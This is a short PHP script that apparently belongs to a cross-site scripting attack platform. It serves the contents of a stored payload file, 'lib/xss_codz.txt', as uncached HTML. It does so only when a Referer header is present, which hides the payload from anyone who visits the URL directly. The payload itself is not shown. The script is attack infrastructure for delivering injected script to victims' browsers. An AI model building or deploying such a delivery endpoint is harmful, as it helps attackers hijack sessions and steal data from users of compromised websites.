<?php
@header("Content-Type:text/html;charset=utf-8");
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . "GMT");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
if($_SERVER['HTTP_REFERER'] == ""){
	echo "";
}else{
	$xss_codz = file_get_contents("lib/xss_codz.txt"); 
	echo $xss_codz;
}
?>
